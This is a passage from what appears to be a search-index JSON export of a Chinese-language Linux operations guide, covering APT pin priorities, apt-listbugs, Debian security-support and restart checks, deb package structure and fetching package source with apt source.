\u200b\u4e0d\u4f1a\u200b\u964d\u7ea7\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u9664\u975e\u200b\u8fdc\u7a0b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u8d85\u8fc7\u200b 1000\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u964d\u7ea7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt install &lt;name&gt;=&lt;version&gt;</code>\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6307\u5b9a\u200b\u4ece\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u7684\u200b\u6e90\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-t</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>apt install -t bookworm-backports yt-dlp\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4f1a\u200b\u5b89\u88c5\u200b backports \u200b\u6e90\u4e2d\u200b\u7684\u200b <code>yt-dlp</code>\u3002\u200b\u5176\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u628a\u200b <code>bookworm-backports</code> \u200b\u6e90\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u4e34\u65f6\u200b\u62c9\u9ad8\u200b\u5230\u200b\u4e86\u200b 990\uff1a</p> <pre><code>$ apt-cache policy -t bookworm-backports yt-dlp\nyt-dlp:\n  Installed: 1:2024.10.07-dmo1\n  Candidate: 1:2025.01.26-dmo1\n  Version table:\n     1:2025.01.26-dmo1 500\n        500 http://mirrors.ustc.edu.cn/deb-multimedia bookworm/main amd64 Packages\n *** 1:2024.10.07-dmo1 100\n        100 /var/lib/dpkg/status\n     2025.01.26-1~bpo12+1 990\n        990 http://mirrors.ustc.edu.cn/debian bookworm-backports/main amd64 Packages\n     2023.03.04-1 500\n        500 http://mirrors.ustc.edu.cn/debian bookworm/main amd64 Packages\n</code></pre> <p>\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u914d\u7f6e\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u76f8\u5173\u200b\u914d\u7f6e\u200b\u4f4d\u4e8e\u200b <code>/etc/apt/preferences</code> \u200b\u548c\u200b <code>/etc/apt/preferences.d/</code> \u200b\u4e2d\u200b\u3002\u200b\u4f18\u5148\u7ea7\u200b\u914d\u7f6e\u200b\u6761\u200b\u76ee\u7684\u200b\u4e00\u822c\u200b\u683c\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>Package: &lt;name&gt;\nPin: &lt;clause&gt;\nPin-Priority: &lt;priority&gt;\n</code></pre> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Package: *\nPin: origin packages.mozilla.org\nPin-Priority: 1000\n</code></pre> <p>\u200b\u90a3\u4e48\u200b packages.mozilla.org \u200b\u62e5\u6709\u200b\u7684\u200b\u5305\u4f1a\u200b\u4f18\u5148\u200b\u4e8e\u200b\u5b98\u65b9\u200b\u4ed3\u5e93\u200b\u88ab\u200b\u9009\u62e9\u200b\u3002\u200b\u4f18\u5148\u7ea7\u200b\u7cfb\u7edf\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u56fa\u5b9a\u200b\u5305\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5c06\u200b <code>mtr-tiny</code> \u200b\u5305\u200b\u56fa\u5b9a\u200b\u5728\u200b 0.87 \u200b\u7248\u672c\u200b\uff1a</p> <pre><code>Package: mtr-tiny\nPin: version 0.87*\nPin-Priority: 1000\n</code></pre> <p>\u200b\u8be6\u7ec6\u200b\u6587\u6863\u200b\u8bf7\u200b\u53c2\u8003\u200b apt_preferences(5)\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u4f18\u5148\u7ea7\u200b\u673a\u5236\u200b\u963b\u6b62\u200b\u8f6f\u4ef6\u5305\u200b\u5b89\u88c5\u200b</p> <p>\u200b\u5f53\u200b <code>Pin-Priority</code> \u200b\u4e3a\u200b\u8d1f\u6570\u200b\u65f6\u200b\uff0cAPT \u200b\u4f1a\u200b\u62d2\u7edd\u200b\u5b89\u88c5\u200b\u8fd9\u4e2a\u200b\u5305\u200b\u3002\u200b\u8bf7\u200b\u9605\u8bfb\u200b\u6587\u6863\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u963b\u6b62\u200b\u5b89\u88c5\u200b <code>snapd</code>\uff08\u200b\u53ef\u200b\u5728\u200b Ubuntu \u200b\u5bb9\u5668\u200b\u4e2d\u200b\u5b9e\u9a8c\u200b\uff09\u3002</p>"},{"location":"ops/package/#listbugs","title":"Bug \u200b\u67e5\u8be2","text":"<p>Debian \u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b bug \u200b\u6c47\u603b\u200b\u4e8e\u200b Debian \u200b\u7f3a\u9677\u200b\u8ddf\u8e2a\u200b\u7cfb\u7edf\u200b\uff08BTS\uff09\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>reportbug</code> \u200b\u5de5\u5177\u200b\u62a5\u544a\u200b bug\uff0c\u200b\u8be6\u60c5\u200b\u89c1\u200b \u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b reportbug \u200b\u5728\u200b Debian \u200b\u4e2d\u200b\u62a5\u544a\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u8fd9\u91cc\u200b\u8981\u200b\u4ecb\u7ecd\u200b\u7684\u200b\u662f\u200b <code>apt-listbugs</code> \u200b\u5de5\u5177\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5b89\u88c5\u200b\u6216\u200b\u5347\u7ea7\u200b\u8f6f\u4ef6\u5305\u200b\u4e4b\u524d\u200b\u5728\u200b BTS \u200b\u4e0a\u200b\u67e5\u8be2\u200b\u5e76\u200b\u63d0\u793a\u200b\u4e25\u91cd\u200b\u7684\u200b bug \u200b\u4fe1\u606f\u200b\u3002\u200b\u76f4\u63a5\u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\u3002\u200b\u4e4b\u540e\u200b\u5728\u200b\u8f6f\u4ef6\u5305\u200b\u4e0b\u8f7d\u200b\u5b8c\u6210\u200b\uff0c\u200b\u5f00\u59cb\u200b\u5b89\u88c5\u200b\u4e4b\u524d\u200b\uff0c<code>apt-listbugs</code> \u200b\u6ce8\u518c\u200b\u7684\u200b hook \u200b\u5c31\u200b\u4f1a\u200b\u67e5\u8be2\u200b\uff0c\u200b\u5982\u679c\u200b\u5b58\u5728\u200b\u7b49\u7ea7\u200b\u4e3a\u200b critical\u3001grave \u200b\u6216\u8005\u200b serious \u200b\u7684\u200b bug\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u63d0\u793a\u200b\u7528\u6237\u200b\uff1a</p> <pre><code>$ sudo apt install gnome-shell\n\uff08\u200b\u7701\u7565\u200b\uff09\nFetched 545 MB in 18s (31.1 MB/s)\nRetrieving bug reports... Done\nParsing Found/Fixed information... Done\ncritical bugs of libgdbm6 (-&gt; 1.23-3) &lt;Outstanding&gt;\n b1 - #1051003 - libgdbm6: trap divide error in libgdbm.so.6.0.0\nserious bugs of gnome-shell (-&gt; 43.9-0+deb12u2) &lt;Outstanding&gt;\n b2 - #931281 - gnome-shell: Session cannot be unlocked when audio dialog for plugged in speaker is active\ngrave bugs of perl (-&gt; 5.36.0-7+deb12u2) &lt;Forwarded&gt;\n b3 - #1098226 - perl: thread creation while a directory handle is open does a fchdir, affecting other threads (race condition)\ngrave bugs of libunwind8 (-&gt; 1.6.2-3) &lt;Forwarded&gt;\n b4 - #994510 - libunwind8 abuses setcontext() causing SIGSEGV on i386 with glibc &gt;= 2.32\ngrave bugs of libmpfr6 (-&gt; 4.2.0-1) &lt;Resolved in some Version&gt;\n b5 - #1057355 - libmpfr6: major formatted output function bugs with %c and the value 0 (Fixed: 4.2.2-1)\nserious bugs of fontconfig-config (-&gt; 2.14.1-4) &lt;Resolved in some Version&gt;\n b6 - #962420 - /usr/local/share/fonts owned by group staff even if /etc/staff-group-for-usr-local not present (Fixed: fontconfig/2.15.0-2.1)\nserious bugs of sane-utils (-&gt; 1.2.1-2) &lt;Resolved in some Version&gt;\n b7 - #1095956 - sane-utils: postinst depends on libsane1.postinst without a PreDepends (Fixed: sane-backends/1.3.1-3)\nserious bugs of initramfs-tools-core (-&gt; 0.142+deb12u1) &lt;Resolved in some Version&gt;\n b8 - #1082647 - copy_exec: [regression] ignores trailing slash, installs file as directory name (Fixed: initramfs-tools/0.142+deb12u2 initramfs-tools/0.146)\nserious bugs of mesa-vulkan-drivers (-&gt; 22.3.6-1+deb12u1) &lt;Resolved in some Version&gt;\n b9 - #980148 - mesa-vulkan-drivers: file content conflict in Multi-Arch:same package (Fixed: mesa/25.0.5-1)\nSummary:\n libgdbm6(1 bug), perl(1 bug), fontconfig-config(1 bug), sane-utils(1 bug), libunwind8(1 bug), gnome-shell(1 bug), libmpfr6(1 bug), initramfs-tools-core(1 bug), mesa-vulkan-drivers(1 bug)\nAre you sure you want to install/upgrade the above packages? [Y/n/?/...]\n</code></pre> <p>\u200b\u5f53\u7136\u200b\u8fd9\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u4f60\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u9047\u5230\u200b\u8fd9\u4e9b\u200b bug\uff0c\u200b\u5728\u200b\u786e\u8ba4\u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u6216\u8005\u200b\u7ec8\u6b62\u200b\u5b89\u88c5\u200b\u3002<code>apt-listbugs</code> \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u67e5\u8be2\u200b\u6307\u5b9a\u200b\u7684\u200b\u5305\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ # \u200b\u67e5\u8be2\u200b critical\u3001grave\u3001serious \u200b\u7ea7\u522b\u200b\u7684\u200b bug\n$ apt-listbugs list gnome-shell\nRetrieving bug reports... Done\nParsing Found/Fixed information... Done\nserious bugs of gnome-shell (-&gt; ) &lt;Outstanding&gt;\n b1 - #931281 - gnome-shell: Session cannot be unlocked when audio dialog for plugged in speaker is active\nSummary:\n gnome-shell(1 bug)\n$ # \u200b\u67e5\u8be2\u200b\u6240\u6709\u200b bug\n$ apt-listbugs list -s all linux\nRetrieving bug reports... Done\nParsing Found/Fixed information... Done\nnormal bugs of linux (-&gt; ) &lt;Outstanding&gt;\n b1 - #1092931 - Most recent kernel is causing issues with touchpad function.\n b2 - #1101733 - debian/templates/image.*.in: allow maint scripts in /usr/share/kernel/*.d\n b3 - #946791 - Please enable CONFIG_IOSCHED_BFQ=y\nwishlist bugs of linux (-&gt; ) &lt;Outstanding&gt;\n b4 - #1024186 - linux: consider deprecating unprivileged_userns_clone\nimportant bugs of linux (-&gt; ) &lt;Forwarded&gt;\n b5 - #945055 - huge CPU temperature increase from 5.2 to 5.5 ... and when using intel_pstate\nnormal bugs of linux (-&gt; ) &lt;Forwarded&gt;\n b6 - #836211 - dpkg: Cannot upgrade some packages on overlayfs: Invalid cross-device link\nimportant bugs of linux (-&gt; ) &lt;Resolved in some Version&gt;\n b7 - #1091858 - zstd: -9 SIGILLs on mips64el (under QEMU -M malta =&gt; invalid baselining?) (Fixed: linux/6.1.129-1 linux/6.12.15-1 linux/6.13.3-1~exp1)\nnormal bugs of linux (-&gt; ) &lt;Resolved in some Version&gt;\n b8 - #1010581 - amd-pstate (Fixed: 6.1~rc7-1~exp1)\n b9 - #1094244 - FTCBFS amd64 -&gt; arm64: cc: error: unrecognized command-line option \u2018-mbranch-protection=standard\u2019 (Fixed: linux/6.13.2-1~exp1)\nwishlist bugs of linux (-&gt; ) &lt;Resolved in some Version&gt;\n b10 - #1024550 - linux: please add configurations for loongarch64 (Fixed: 6.7.7-1)\nSummary:\n linux(10 bugs)\n</code></pre>"},{"location":"ops/package/#security-check","title":"\u5b89\u5168\u68c0\u67e5","text":"<p>\u200b\u5c3d\u7ba1\u200b Debian \u200b\u7a33\u5b9a\u200b\u7248\u672c\u200b\u6709\u7740\u200b\u591a\u5e74\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u4f46\u662f\u200b\u5176\u4e2d\u200b\u7684\u200b\u4e00\u5c0f\u90e8\u5206\u200b\u8f6f\u4ef6\u5305\u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u6709\u6548\u200b\u5730\u200b\u8fdb\u884c\u200b\u5b89\u5168\u66f4\u65b0\u200b\uff0c\u200b\u6216\u8005\u200b\u7531\u4e8e\u200b\u8bbe\u8ba1\u200b\u539f\u56e0\u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002<code>debian-security-support</code> \u200b\u5305\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u7528\u6237\u200b\u68c0\u67e5\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u65e0\u6cd5\u200b\u518d\u200b\u63d0\u4f9b\u200b\u5b89\u5168\u200b\u7ef4\u62a4\u200b\u7684\u200b\u5305\u200b\u3002\u200b\u5728\u200b\u5b89\u88c5\u200b\u65f6\u8be5\u200b\u5305\u200b\u5c31\u200b\u4f1a\u200b\u663e\u793a\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>check-support-status</code> \u200b\u547d\u4ee4\u200b\u624b\u52a8\u200b\u68c0\u67e5\u200b\uff1a</p> <pre><code>$ check-support-status\nEnded security support for one or more packages\n\nUnfortunately, it has been necessary to end security support for some \npackages before the end of the regular security maintenance life cycle.\n\nThe following packages found on this system are affected by this:\n\n* Source:intel-mediasdk, ended on 2024-11-21 at version 22.5.4-1\n  Details: abandoned upstream, upstream does not publish enough information to fix issues.\n  Affected binary package:\n  - libmfx1:amd64 (installed version: 22.5.4-1)\n\nLimited security support for one or more packages\n\nUnfortunately, it has been necessary to limit security support for some \npackages.\n\nThe following packages found on this system are affected by this:\n\n* Source:binutils\n  Details: Only suitable for trusted content; see https://lists.debian.org/msgid-search/87lfqsomtg.fsf@mid.deneb.enyo.de\n  Affected binary packages:\n  - binutils (installed version: 2.40-2)\n  - binutils-common:amd64 (installed version: 2.40-2)\n  - binutils-x86-64-linux-gnu (installed version: 2.40-2)\n  - libbinutils:amd64 (installed version: 2.40-2)\n  - libctf-nobfd0:amd64 (installed version: 2.40-2)\n  - libctf0:amd64 (installed version: 2.40-2)\n  - libgprofng0:amd64 (installed version: 2.40-2)\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c<code>needrestart</code> \u200b\u5305\u200b\u53ef\u4ee5\u200b\u68c0\u67e5\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u54ea\u4e9b\u200b\u670d\u52a1\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5185\u6838\u200b\u672c\u8eab\u200b\u662f\u5426\u200b\u9700\u8981\u200b\u91cd\u542f\u200b\u6765\u200b\u66f4\u65b0\u200b\u3002\u200b\u5b89\u88c5\u200b\u8be5\u200b\u5305\u540e\u200b\uff0c\u200b\u5728\u200b\u7cfb\u7edf\u200b\u66f4\u65b0\u200b\u65f6\u200b\u5b83\u200b\u7684\u200b hook \u200b\u5c31\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u68c0\u67e5\u200b\u9700\u8981\u200b\u91cd\u542f\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5e76\u200b\u63d0\u793a\u200b\u7528\u6237\u200b\uff0c\u200b\u5728\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u91cd\u542f\u200b\u54ea\u4e9b\u200b\u670d\u52a1\u200b\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u6267\u884c\u200b <code>needrestart</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u68c0\u67e5\u200b\u3002</p> <pre><code>$ # \u200b\u68c0\u67e5\u7528\u6237\u200b\u81ea\u5df1\u200b\u7684\u200b\u8fdb\u7a0b\u200b\n$ /sbin/needrestart\nScanning processes...\nYour outdated processes:\nevolution-alarm[3599], evolution-sourc[3678], goa-daemon[3436]\n$ # \u200b\u68c0\u67e5\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u200b\n$ sudo /sbin/needrestart\nScanning processes...\nScanning candidates...\nScanning linux images...\n\nNo services need to be restarted.\n\nNo containers need to be restarted.\n\nUser sessions running outdated binaries:\n user @ session #2: cinnamon-sessio[3100]\n user @ user manager service: systemd[3071]\n\nNo VM guests are running outdated hypervisor (qemu) binaries on this host.\n</code></pre>"},{"location":"ops/package/#deb-package","title":"DEB \u200b\u8f6f\u4ef6\u5305","text":"<p>\u200b\u672c\u200b\u8282\u200b\u4ecb\u7ecd\u200b DEB \u200b\u8f6f\u4ef6\u5305\u200b\u5305\u542b\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5982\u4f55\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u7b80\u5355\u200b\u7684\u200b\u4fee\u6539\u200b\u4e0e\u200b\u6253\u5305\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u5bf9\u200b\u4e3a\u200b Debian \u200b\u6253\u5305\u200b\u611f\u5174\u8da3\u200b\uff0c\u200b\u5f3a\u70c8\u5efa\u8bae\u200b\u9605\u8bfb\u200b Debian \u200b\u7ef4\u62a4\u8005\u200b\u6307\u5357\u200b\u3002\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b\u5168\u9762\u200b\u3001\u200b\u5b8c\u6574\u200b\u7684\u200b\u6253\u5305\u200b\u6d41\u7a0b\u200b\u7684\u200b\u4ecb\u7ecd\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u6700\u4f73\u200b\u5b9e\u8df5\u200b\u7b49\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u7684\u200b\u6b65\u9aa4\u200b\u4ec5\u200b\u9002\u7528\u200b\u4e8e\u200b\u7b80\u5355\u200b\u3001\u200b\u975e\u5b98\u65b9\u200b\u7684\u200b\u9700\u6c42\u200b\u3002</p>"},{"location":"ops/package/#deb-structure","title":"\u8f6f\u4ef6\u5305\u200b\u7ed3\u6784","text":"<p>Deb \u200b\u5305\u662f\u200b\u4e00\u4e2a\u200b ar \u200b\u683c\u5f0f\u200b\u7684\u200b\u5305\u200b\uff0c\u200b\u5305\u542b\u200b\u4e09\u4e2a\u200b\u6587\u4ef6\u200b\uff08\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>ar t</code> \u200b\u67e5\u770b\u200b\uff0c<code>ar x</code> \u200b\u89e3\u538b\u200b\uff09\uff1a</p> <ul> <li><code>debian-binary</code>\uff1a\u200b\u5305\u542b\u200b\u7248\u672c\u53f7\u200b\u7684\u200b\u6587\u672c\u6587\u4ef6\u200b\uff0c\u200b\u76ee\u524d\u200b\u7248\u672c\u200b\u4e3a\u200b <code>2.0</code>\u3002</li> <li><code>control.tar.xz</code>\uff08\u200b\u6216\u200b <code>control.tar.zst</code> \u200b\u7b49\u200b\uff09\uff1a\u200b\u5305\u542b\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3001\u200b\u63cf\u8ff0\u200b\u3001\u200b\u5b89\u88c5\u200b\u811a\u672c\u200b\u7b49\u200b\u3002</li> <li><code>data.tar.xz</code>\uff08\u200b\u6216\u200b <code>data.tar.zst</code> \u200b\u7b49\u200b\uff09\uff1a\u200b\u5305\u542b\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u5b9e\u9645\u200b\u6587\u4ef6\u200b\u3002</li> </ul> <p>ar \u200b\u4e0e\u200b tar</p> <p>ar \u200b\u683c\u5f0f\u200b\uff081971\uff09\u200b\u4e0e\u200b tar\uff081979\uff09\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u5f52\u6863\u200b\u683c\u5f0f\u200b\u3002\u200b\u7531\u4e8e\u200b ar \u200b\u4e0d\u200b\u652f\u6301\u200b\u76ee\u5f55\u200b\uff0c\u200b\u56e0\u6b64\u200b\u76ee\u524d\u200b ar \u200b\u4ec5\u200b\u7528\u4e8e\u200b\u751f\u6210\u200b\u9759\u6001\u200b\u94fe\u63a5\u5e93\u200b\uff08<code>.a</code> \u200b\u6587\u4ef6\u200b\uff09\u200b\u4e0e\u200b deb \u200b\u5305\u200b\u3002</p>"},{"location":"ops/package/#control","title":"<code>control</code>","text":"<p><code>control.tar.xz</code> \u200b\u4e2d\u200b\u7684\u200b <code>control</code> \u200b\u6587\u4ef6\u200b\u662f\u200b\u5305\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u5305\u542b\u200b\u7248\u672c\u200b\u3001\u200b\u4f9d\u8d56\u200b\u3001\u200b\u63cf\u8ff0\u200b\u3001\u200b\u7ef4\u62a4\u8005\u200b\u7b49\u7b49\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>Package: sudo\nVersion: 1.9.9-1ubuntu2.3\nArchitecture: amd64\nMaintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;\nInstalled-Size: 2504\nDepends: libaudit1 (&gt;= 1:2.2.1), libc6 (&gt;= 2.34), libpam0g (&gt;= 0.99.7.1), libselinux1 (&gt;= 3.1~), zlib1g (&gt;= 1:1.2.0.2), libpam-modules, lsb-base\nConflicts: sudo-ldap\nReplaces: sudo-ldap\nSection: admin\nPriority: optional\nHomepage: https://www.sudo.ws/\nDescription: Provide limited super user privileges to specific users\n Sudo is a program designed to allow a sysadmin to give limited root\n privileges to users and log root activity.  The basic philosophy is to give\n as few privileges as possible but still allow people to get their work done.\n .\n This version is built with minimal shared library dependencies, use the\n sudo-ldap package instead if you need LDAP support for sudoers.\nOriginal-Maintainer: Sudo Maintainers &lt;sudo@packages.debian.org&gt;\n</code></pre> <p>\u200b\u6709\u5173\u200b\u5177\u4f53\u200b\u5404\u4e2a\u200b\u5b57\u6bb5\u200b\u7684\u200b\u542b\u4e49\u200b\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b Debian Policy Manual \u200b\u7684\u200b\u7b2c\u4e94\u7ae0\u200b Control files and their fields \u200b\u4e0e\u200b\u7b2c\u4e03\u7ae0\u200b Declaring relationships between packages\u3002</p>"},{"location":"ops/package/#_2","title":"\u5176\u4ed6\u200b\u6587\u4ef6","text":"<p>\u200b\u6b64\u5916\u200b\uff0c<code>control.tar.xz</code> \u200b\u53ef\u4ee5\u200b\u5305\u542b\u200b\u4e00\u4e9b\u200b hook \u200b\u811a\u672c\u200b\uff0c\u200b\u5728\u200b\u5b89\u88c5\u200b\u4e0e\u200b\u5220\u9664\u200b\u524d\u540e\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5305\u62ec\u200b <code>preinst</code>, <code>prerm</code>, <code>postinst</code>, <code>postrm</code>\u3002\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5305\u542b\u200b\u4ee5\u4e0b\u200b\u6587\u4ef6\u200b\uff1a</p> <ul> <li><code>md5sums</code>\uff0c\u200b\u7528\u4e8e\u200b\u6821\u9a8c\u200b\u5305\u200b\u6587\u4ef6\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\u3002</li> <li><code>conffiles</code>\uff0c\u200b\u6807\u5fd7\u200b\u5305\u200b\u5b89\u88c5\u200b\u7684\u200b\u54ea\u4e9b\u200b\u6587\u4ef6\u200b\u662f\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3002</li> <li><code>shlibs</code>\uff0c\u200b\u5982\u679c\u200b\u8f6f\u4ef6\u5305\u200b\u5305\u542b\u200b\u4e86\u200b\u52a8\u6001\u200b\u5e93\u200b\uff08<code>.so</code>\uff09\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u5c31\u200b\u9700\u8981\u200b\u5305\u542b\u200b\u5e93\u200b\u7684\u200b\u7248\u672c\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u200b\u5e2e\u52a9\u200b\u5176\u4ed6\u200b\u8f6f\u4ef6\u5305\u200b\u89e3\u51b3\u200b\u76f8\u5173\u200b\u7684\u200b\u4f9d\u8d56\u200b\u95ee\u9898\u200b\u3002</li> <li><code>triggers</code>\uff0c\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u8f6f\u4ef6\u5305\u200b\u611f\u5174\u8da3\u200b\uff08interest\uff09\u200b\u7684\u200b\u89e6\u53d1\u5668\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8f6f\u4ef6\u5305\u200b\u72b6\u6001\u200b\u53d8\u5316\u200b\u65f6\u4f1a\u200b\u89e6\u53d1\u200b\uff08activate\uff09\u200b\u7684\u200b\u89e6\u53d1\u5668\u200b\u3002</li> </ul>"},{"location":"ops/package/#apt-source","title":"\u83b7\u53d6\u200b\u8f6f\u4ef6\u5305\u200b\u6e90\u7801","text":"<p>Debian \u200b\u76ee\u524d\u200b\u5927\u591a\u6570\u200b\u7684\u200b\u5305\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5728\u200b Debian Salsa GitLab \u200b\u4e0a\u200b\u627e\u5230\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b Debian Package Tracker \u200b\u4e0a\u200b\u627e\u5230\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b git clone \u200b\u4e4b\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt source &lt;package&gt;</code> \u200b\u6765\u200b\u4e0b\u8f7d\u200b\u6e90\u7801\u200b\u3002\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8be5\u200b\u529f\u80fd\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>dpkg-dev</code>\uff0c\u200b\u4e14\u200b\u9700\u8981\u200b\u5728\u200b <code>/etc/apt/sources.list</code> \u200b\u6216\u200b <code>/etc/apt/sources.list.d/debian.sources</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b <code>deb-src</code>\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>deb-src http://deb.debian.org/debian/ bookworm main\n</code></pre> <p>\u200b\u6216\u8005\u200b\u8fd9\u6837\u200b\uff08DEB822\uff09\uff1a</p> <pre><code>Types: deb deb-src\nURIs: http://deb.debian.org/debian/\nSuites: bookworm\nComponents: main\nSigned-By: /usr/share/keyrings/debian-archive-keyring.gpg\n</code></pre> <p>DEB822</p> <p>DEB822 \u200b\u662f\u200b Debian \u200b\u65b0\u200b\u7684\u200b\u4ed3\u5e93\u200b\u914d\u7f6e\u200b\u683c\u5f0f\u200b\uff0c\u200b\u7528\u4e8e\u200b\u53d6\u4ee3\u200b\u65e7\u200b\u7684\u200b <code>sources.list</code> \u200b\u683c\u5f0f\u200b\uff08\u200b\u53c8\u200b\u88ab\u200b\u79f0\u4e3a\u200b One-Line-Style \u200b\u683c\u5f0f\u200b\uff09\u3002\u200b\u8be6\u60c5\u200b\u53ef\u200b\u9605\u8bfb\u200b https://repolib.readthedocs.io/en/latest/deb822-format.html\u3002</p> <p><code>apt source</code> \u200b\u4f1a\u200b\u4e0b\u8f7d\u200b\u5fc5\u8981\u200b\u7684\u200b\u6587\u4ef6\u200b\u3001\u200b\u89e3\u538b\u200b\u5e76\u200b\u5e94\u7528\u200b Debian \u200b\u7684\u200b\u8865\u4e01\u200b\uff1a</p> <pre><code>$ apt source sudo\nReading package lists... Done\nNOTICE: 'sudo' packaging is maintained in the 'Git' version control system at:\nhttps://salsa.debian.org/sudo-team/sudo.git\nPlease use:\ngit clone https://salsa.debian.org/sudo-team/sudo.git\nto retrieve the latest (possibly unreleased) updates to the package.\nSkipping already downloaded file 'sudo_1.9.13p3-1+deb12u1.dsc'\nSkipping already downloaded file 'sudo_1.9.13p3.orig.tar.gz'\nSkipping already downloaded file 'sudo_1.9.13p3.orig.tar.gz.asc'\nSkipping already downloaded file 'sudo_1.9.13p3-1+deb12u1.debian.tar.xz'\nNeed to get 0 B of source 